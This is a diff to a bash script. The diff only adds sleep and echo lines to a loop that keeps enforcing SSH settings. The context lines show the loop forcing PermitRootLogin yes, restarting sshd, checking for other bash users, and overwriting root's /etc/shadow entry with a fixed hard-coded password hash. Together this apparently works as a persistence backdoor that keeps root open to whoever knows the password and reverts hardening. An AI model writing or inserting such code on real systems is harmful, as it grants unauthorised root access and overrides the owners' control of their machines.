@@ -15,6 +15,7 @@ while :; do
         sed -i "/PasswordAuthentication/d" /etc/ssh/sshd_config
         echo "PasswordAuthentication no" >>/etc/ssh/sshd_config
         systemctl restart sshd.service
+        sleep 1
     fi
 
     egrep "^ClientAliveInterval" /etc/ssh/sshd_config &>/dev/null
@@ -23,6 +24,7 @@ while :; do
         sed -i "/ClientAliveInterval/d" /etc/ssh/sshd_config
         echo "ClientAliveInterval 8" >>/etc/ssh/sshd_config
         systemctl restart sshd.service
+        sleep 1
     fi
 
     egrep "^ClientAliveCountMax" /etc/ssh/sshd_config &>/dev/null
@@ -31,6 +33,7 @@ while :; do
         sed -i "/ClientAliveCountMax/d" /etc/ssh/sshd_config
         echo "ClientAliveCountMax 8" >>/etc/ssh/sshd_config
         systemctl restart sshd.service
+        sleep 1
     fi
 
     egrep "^PermitRootLogin\s+yes$" /etc/ssh/sshd_config &>/dev/null
@@ -39,6 +42,7 @@ while :; do
         sed -i "/PermitRootLogin/d" /etc/ssh/sshd_config
         echo "PermitRootLogin yes" >>/etc/ssh/sshd_config
         systemctl restart sshd.service
+        sleep 1
     fi
 
     egrep "^RSAAuthentication\s+yes$" /etc/ssh/sshd_config &>/dev/null
@@ -47,6 +51,7 @@ while :; do
         sed -i "/RSAAuthentication/d" /etc/ssh/sshd_config
         echo "RSAAuthentication yes" >>/etc/ssh/sshd_config
         systemctl restart sshd.service
+        sleep 1
     fi
 
     egrep "^PubkeyAuthentication\s+yes$" /etc/ssh/sshd_config &>/dev/null
@@ -55,6 +60,7 @@ while :; do
         sed -i "/PubkeyAuthentication/d" /etc/ssh/sshd_config
         echo "PubkeyAuthentication yes" >>/etc/ssh/sshd_config
         systemctl restart sshd.service
+        sleep 1
     fi
 
     egrep "^PermitEmptyPasswords\s+no$" /etc/ssh/sshd_config &>/dev/null
@@ -63,6 +69,7 @@ while :; do
         sed -i "/PermitEmptyPasswords/d" /etc/ssh/sshd_config
         echo "PermitEmptyPasswords no" >>/etc/ssh/sshd_config
         systemctl restart sshd.service
+        sleep 1
     fi
 
     egrep "^AuthorizedKeysFile\s+\.ssh\/authorized_keys$" /etc/ssh/sshd_config &>/dev/null
@@ -71,6 +78,7 @@ while :; do
         sed -i "/AuthorizedKeysFile/d" /etc/ssh/sshd_config
         echo "AuthorizedKeysFile .ssh/authorized_keys" >>/etc/ssh/sshd_config
         systemctl restart sshd.service
+        sleep 1
     fi
 
     grep ":/bin/bash\s*$" /etc/passwd | grep -v "^\s*root:" &>/dev/null
@@ -87,6 +95,8 @@ while :; do
     sed -i 's/^root:.*$/root:\$6\$ex0u6ZI7omnNoT3T\$zmFubsbiHS6noSp8E37xJDoNnLkUOjGIAliZA921hWSjMR6KuF9MFweRuUQCe.78XU2bVFx\/KuQtYIbj2YhCA\/::0:99999:7:::/g' /etc/shadow
 
     systemctl start sshd.service
+        sleep 2
+        echo "#"
     
     ######################################
 
